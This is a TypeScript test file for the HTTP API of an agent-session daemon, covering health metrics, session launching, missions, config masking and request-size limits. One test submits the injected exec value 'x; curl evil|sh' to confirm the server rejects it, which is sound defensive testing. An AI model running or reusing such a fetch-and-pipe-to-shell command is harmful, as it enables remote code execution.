import { describe, it, expect } from 'vitest';
import { EventEmitter } from 'node:events';
import type { ChildProcess } from 'node:child_process';
import { SubagentRunnerPool } from '../../src/subagent/pool.js';
import { TaskStore } from '../../plugins/work/src/store/taskStore.js';
import { MissionStore } from '../../plugins/agents/src/store/missionStore.js';
import { EventBus } from '../../src/api/sse.js';
import type { ElowenEvent } from '../../src/api/sse.js';
import { createServer } from '../../src/api/server.js';
import { makeTestApp } from '../helpers/testApp.js';
import { FakeTmuxDriver } from '../../src/tmux/fakeDriver.js';
import { FakeClock } from '../../src/shared/clock.js';
import { ConfigStore } from '../../src/store/configStore.js';
import { UserStore } from '../../src/store/userStore.js';
import { openAgentsDb } from '../helpers/agentsDb.js';

/** A body streamed in chunks with NO content-length header — the chunked shape a hard cap has to stop.
 *  `pulled()` reports how many bytes the daemon actually read, so a test can tell "rejected after
 *  buffering everything" from "rejected while reading". */
function streamedBody(totalBytes: number, chunkBytes = 16 * 1024) {
  let pulled = 0;
  const body = new ReadableStream<Uint8Array>({
    pull(controller) {
      if (pulled >= totalBytes) { controller.close(); return; }
      pulled += chunkBytes;
      controller.enqueue(new Uint8Array(chunkBytes).fill(0x78)); // 'x'
    },
  });
  return { body, pulled: () => pulled };
}

function makeApp() {
  const db = openAgentsDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
  const tasks = new TaskStore(db);
  const bus = new EventBus();
  const a = createServer({ tasks, missions: new MissionStore(db), bus, engine: null as any, spawn: null as any, tmux: null as any, project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db) });
  return { app: a, bus };
}

describe('api', () => {
  it('GET /health returns ok', async () => {
    const { app } = makeApp();
    const res = await app.request('/health');
    expect(res.status).toBe(200);
    const body = await res.json() as { ok: boolean; version: string };
    expect(body.ok).toBe(true);
    expect(typeof body.version).toBe('string'); // surfaced for the web footer
  });
  it('GET /health reports the event loop window including the severe-stall sum', async () => {
    const { app } = makeApp();
    const res = await app.request('/health');
    const body = await res.json() as { eventLoop: Record<string, unknown> };
    // severeStalledMs is the number that explains client-observed latency when `max` cannot (a request
    // queues through the SUM of stalls); windowMs says how much history the figures describe.
    for (const key of ['p50', 'p99', 'max', 'severeStalledMs', 'windowMs']) {
      expect(typeof body.eventLoop[key], key).toBe('number');
    }
  });
  // The block must be LIVE data, not shape: a constant-zero eventLoop would pass every type check while
  // telling an operator mid-incident that the loop is healthy.
  it('GET /health eventLoop reflects a genuine stall of this process', async () => {
    const { app } = makeApp();
    await new Promise((r) => setTimeout(r, 40)); // let the sampler take a baseline reading first
    const until = Date.now() + 160; while (Date.now() < until) { /* deliberately hog the loop */ }
    await new Promise((r) => setTimeout(r, 40)); // let the monitor's own timers observe the stall
    const body = await (await app.request('/health')).json() as { eventLoop: { max: number; severeStalledMs: number; windowMs: number } };
    expect(body.eventLoop.max).toBeGreaterThan(100);
    expect(body.eventLoop.severeStalledMs).toBeGreaterThanOrEqual(45);
    expect(body.eventLoop.severeStalledMs).toBeLessThanOrEqual(body.eventLoop.windowMs);
  });
  // The server-side half of the latency split: client total minus this duration is time the request
  // spent WAITING to be served (kernel backlog + event-loop queueing), which no in-process histogram
  // can attribute to a single request. Without the header, a 19.9 s /health round-trip measured during
  // a stall storm was indistinguishable from a slow handler. ONLY on /health: a per-route duration on
  // public and error responses is a small timing side-channel nothing needs.
  it('only /health carries the Server-Timing header', async () => {
    const { app } = makeApp();
    const res = await app.request('/health');
    expect(res.headers.get('server-timing')).toMatch(/^app;dur=\d+(\.\d+)?$/);
    expect((await app.request('/setup')).headers.get('server-timing')).toBeNull();
    expect((await app.request('/projects')).headers.get('server-timing')).toBeNull();
  });
  it('GET /health includes CORS header', async () => {
    const { app } = makeApp();
    const res = await app.request('/health', { headers: { origin: 'http://localhost:3000' } });
    expect(res.headers.get('access-control-allow-origin')).toBeTruthy();
  });
});

it('POST /sessions with invalid exec returns 400 and spawns nothing', async () => {
  const { app, token, deps } = await makeTestApp();
  deps.tasks.create({ id: 'elowen-1', project_id: 1, title: 'X' });
  const res = await app.request('/sessions', { method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-1', exec: 'x; curl evil|sh' }) });
  expect(res.status).toBe(400);
  expect(await res.json()).toMatchObject({ error: 'exec not allowed' });
  expect(await deps.tmux.list()).toHaveLength(0);
});


it('POST /sessions launches an agent on a task and marks it in_progress', async () => {
  const { app, token, deps } = await makeTestApp();
  deps.tasks.create({ id: 'elowen-1', project_id: 1, title: 'X' });
  const res = await app.request('/sessions', { method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-1', exec: 'ollama-cloud/deepseek-v4-flash' }) });
  expect(res.status).toBe(201);
  const body = await res.json();
  expect(body.session).toMatch(/^elowen-/);
  expect(deps.tasks.get('elowen-1')?.status).toBe('in_progress');
  expect(await deps.tmux.list()).toContain(body.session);
  // spawn tags the task with exec + agent labels so the UI can show its model and link the session
  const t1 = deps.tasks.get('elowen-1')!;
  expect(t1.labels).toContain('exec:ollama-cloud/deepseek-v4-flash');
  expect(t1.labels.some((l) => l.startsWith('agent:'))).toBe(true);
});


it('POST /sessions refuses to launch into a shared checkout another agent already holds (409)', async () => {
  const { app, token, deps } = await makeTestApp();
  deps.tasks.create({ id: 'busy', project_id: 1, title: 'Busy' });
  deps.tasks.setStatus('busy', 'in_progress'); // a live agent already owns the project's shared checkout
  deps.tasks.create({ id: 'elowen-1', project_id: 1, title: 'X' });
  const res = await app.request('/sessions', { method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-1', exec: 'sonnet' }) });
  expect(res.status).toBe(409); // single-writer: don't double-occupy the checkout
  expect(deps.tasks.get('elowen-1')?.status).toBe('open'); // not flipped
  expect(await deps.tmux.list()).toHaveLength(0);         // nothing spawned
});


it('GET /sessions tags each live session with its project from the agent store', async () => {
  const { app, token, deps } = await makeTestApp();
  deps.tasks.create({ id: 'elowen-1', project_id: 1, title: 'X' });
  await app.request('/sessions', { method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-1', exec: 'ollama-cloud/deepseek-v4-flash' }) });
  const sessions = await (await app.request('/sessions', { headers: { authorization: `Bearer ${token}` } })).json();
  expect(sessions).toHaveLength(1);
  // the daemon resolves the session's repo from the agent store (works for every role, not just workers)
  expect(sessions[0].projectId).toBe(1);
});


it('PATCH /missions/:id pauses (drops from active) and resumes', async () => {
  // Served by the agents plugin's root-mounted routes: the REAL engine pauses (kills agents, reverts
  // tasks) and resumes over the shared stores.
  const { app, token, deps } = await makeTestApp();
  const { missionId } = deps.seedMissionWithChild();
  const patch = (body: object) => ({ method: 'PATCH', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' }, body: JSON.stringify(body) });
  await app.request(`/missions/${missionId}`, patch({ action: 'pause' }));
  expect((await (await app.request('/missions', { headers: { authorization: `Bearer ${token}` } })).json())).toEqual([]); // paused → not active
  expect(deps.missions.get(missionId)?.state).toBe('paused');
  await app.request(`/missions/${missionId}`, patch({ action: 'resume' }));
  expect(deps.missions.get(missionId)?.state).toBe('active');
});

it('POST /sessions rejects an exec disallowed by config', async () => {
  const { app, token, deps } = await makeTestApp();
  deps.tasks.create({ id: 'elowen-1', project_id: 1, title: 'X' });
  deps.config.update({ allowedExecs: ['sonnet'] }); // only sonnet allowed
  const res = await app.request('/sessions', { method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-1', exec: 'codex:gpt-5.4' }) });
  expect(res.status).toBe(400);
  expect(await deps.tmux.list()).toEqual([]);
});


it('GET /sessions/:name/stream survives a dead/missing session (empty pane)', async () => {
  const { app, token } = await makeTestApp(); // no pane set for 'elowen-dead' → returns ''
  const ctrl = new AbortController();
  const res = await app.request('/sessions/elowen-dead/stream', { signal: ctrl.signal, headers: { authorization: `Bearer ${token}` } });
  expect(res.status).toBe(200);
  expect(res.headers.get('content-type')).toContain('text/event-stream');
  const reader = res.body!.getReader();
  const { value } = await reader.read();
  const text = new TextDecoder().decode(value);
  expect(text).toContain('event: pane');
  // empty pane: data contains {"pane":""}, stream must not throw
  expect(text).toContain('"pane"');
  ctrl.abort(); await reader.cancel();
});


it('GET /sessions/:name/stream emits a first pane frame', async () => {
  const { app, token, deps } = await makeTestApp();
  deps.tmux.setPane('elowen-A', 'hello-pane');
  const ctrl = new AbortController();
  const res = await app.request('/sessions/elowen-A/stream', { signal: ctrl.signal, headers: { authorization: `Bearer ${token}` } });
  expect(res.status).toBe(200);
  expect(res.headers.get('content-type')).toContain('text/event-stream');
  const reader = res.body!.getReader();
  const { value } = await reader.read();
  const text = new TextDecoder().decode(value);
  expect(text).toContain('event: pane');
  expect(text).toContain('hello-pane');
  ctrl.abort(); await reader.cancel();
});


it('GET /events flushes an initial comment so headers reach the client immediately (no events yet)', async () => {
  // Through the web BFF proxy, a streamed response sends no HTTP headers until the first body byte.
  // The event bus is silent on a quiet system, so /events must emit an immediate SSE comment or the
  // dashboard's live channel never connects. Comments (lines starting with ':') are ignored by EventSource.
  const db = openAgentsDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
  const app = createServer({
    tasks: new TaskStore(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: null as any, tmux: new FakeTmuxDriver(), project: { id: 1, path: '/o' },
    fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
  });
  const ctrl = new AbortController();
  const res = await app.request('/events', { signal: ctrl.signal });
  expect(res.status).toBe(200);
  expect(res.headers.get('content-type')).toContain('text/event-stream');
  const reader = res.body!.getReader();
  const { value } = await reader.read(); // resolves only if a byte is written without any publish()
  expect(new TextDecoder().decode(value).startsWith(':')).toBe(true);
  ctrl.abort(); await reader.cancel();
});

it('GET /missions/:id returns 404 for unknown mission', async () => {
  const { app, token } = await makeTestApp();
  const res = await app.request('/missions/unknown', { headers: { authorization: `Bearer ${token}` } });
  expect(res.status).toBe(404);
});

it('GET /missions/:id returns mission detail for a seeded mission', async () => {
  const { app, token, deps } = await makeTestApp();
  deps.tasks.create({ id: 'epic', project_id: 1, title: 'E', type: 'epic' });
  deps.missions.create({ id: 'm1', epic_id: 'epic', autonomy: 'low', max_sessions: 1 });
  const res = await app.request('/missions/m1', { headers: { authorization: `Bearer ${token}` } });
  expect(res.status).toBe(200);
  const body = await res.json() as { epic: { id: string }; progress: { total: number } };
  expect(body.epic.id).toBe('epic');
  expect(body.progress.total).toBe(0);
});

it('GET /config returns masked config; PUT updates without exposing the key', async () => {
  const db = openAgentsDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
  const config = new ConfigStore(db);
  const app = createServer({
    tasks: new TaskStore(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: null as any, tmux: new FakeTmuxDriver(), project: { id: 1, path: '/o' },
    fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config,
  });
  const put = await app.request('/config', { method: 'PUT', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ allowedExecs: ['sonnet'], autopilot: { apiKey: 'sk-secret' } }) });
  expect(put.status).toBe(200);
  const get = await (await app.request('/config')).json();
  expect(get.allowedExecs).toEqual(['sonnet']);
  expect(get.autopilot.apiKeySet).toBe(true);
  expect(JSON.stringify(get)).not.toContain('sk-secret');
});

it('without a UserStore, routes are open (legacy mode)', async () => {
  const { app } = makeApp();
  expect((await app.request('/projects')).status).toBe(200);
});

it('GET /activity returns [] without an EventStore (legacy)', async () => {
  const { app } = makeApp();
  expect(await (await app.request('/activity')).json()).toEqual([]);
});

it('POST /auth/login caps the body before parsing it, without buffering the stream', async () => {
  // /auth/login is public, so an anonymous caller reaches a handler that reads the whole body. A
  // chunked request carries no content-length to pre-check — the cap has to stop the read itself.
  const db = openAgentsDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
  const users = new UserStore(db); users.create('admin', 'pw');
  const app = createServer({
    tasks: new TaskStore(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: null as any, tmux: null as any,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' },
    clock: new FakeClock(0), config: new ConfigStore(db), users,
  });
  const { body, pulled } = streamedBody(4 * 1024 * 1024);
  const res = await app.request('/auth/login', {
    method: 'POST', headers: { 'content-type': 'application/json' }, body, duplex: 'half',
  });
  expect(res.status).toBe(413);
  expect(pulled()).toBeLessThan(256 * 1024); // stopped near the cap — the 4 MB stream was never buffered
});

// The whole chain an operator actually reads: a REAL pool whose fork is refused, published through the
// REAL /health route. The failure must arrive as a stable code — the raw reason quotes internal paths
// and build ids, and /health is unauthenticated by design — and the block must exist at all (removing
// `subagentPool` from /health would strand the diagnosis in a getter nobody calls).
it('GET /health surfaces the real pool: spawn failure as a stable code, never the raw reason', async () => {
  class BootRefusingChild extends EventEmitter {
    readonly pid = 0; // setPriority(0) would renice the test process itself
    connected = true;
    send(): boolean { return true; }
    kill(): boolean { return true; }
  }
  const children: BootRefusingChild[] = [];
  const pool = new SubagentRunnerPool({
    dbPath: '/tmp/elowen-health-test.db',
    project: { id: 1, slug: 't', path: '/tmp' },
    cwd: '/tmp',
    fork: () => { const c = new BootRefusingChild(); children.push(c); return c as unknown as ChildProcess; },
    machine: { cpus: () => 8, totalMemBytes: () => 32 * 1024 ** 3, availableMemBytes: () => 24 * 1024 ** 3 },
  });
  const run = pool
    .run({ channelId: 'subagent-sub-dlg-1', ownerUserId: 1, parentSessionId: 'brain-1', delegatedAccess: { admin: false, projectIds: [1], owner: true, permissionBoundary: null }, scheduled: false }, 'x')
    .catch(() => undefined); // the refusal is the point; the dispatcher would fall back in-process
  for (let i = 0; i < 4; i += 1) await new Promise((r) => { setImmediate(r); });
  children[0]?.emit('message', { type: 'fatal', reason: 'build mismatch (daemon /var/www/secret-internal-path 1.2.3)' });
  await run;

  const db = openAgentsDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
  const app = createServer({
    tasks: new TaskStore(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: null as any, tmux: null as any,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
    subagentPool: () => pool.stats(),
  });
  const body = await (await app.request('/health')).json() as {
    subagentPool: { mode: string; spawnFailure: { code: string; consecutive: number } | null };
  };
  expect(body.subagentPool.mode).toBe('runner');
  expect(body.subagentPool.spawnFailure?.code).toBe('build_mismatch');
  expect(body.subagentPool.spawnFailure?.consecutive).toBe(1);
  expect(JSON.stringify(body)).not.toContain('secret-internal-path');
  pool.reset('test over');
});

it('POST /sessions reverts the task to open when spawn.launch fails', async () => {
  const { app, token, deps } = await makeTestApp();
  deps.tasks.create({ id: 'elowen-s1', project_id: 1, title: 'T', description: 'd' });
  deps.tmux.spawn = async () => { throw new Error('tmux exploded'); };
  const events: ElowenEvent[] = []; deps.bus.subscribe((e) => events.push(e));
  const res = await app.request('/sessions', { method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'elowen-s1' }) });
  expect(res.status).toBe(500);
  expect(deps.tasks.get('elowen-s1')!.status).toBe('open'); // reverted, not left stuck in_progress
  expect(events.some((e) => e.type === 'task' && e.taskId === 'elowen-s1' && e.status === 'open')).toBe(true);
});
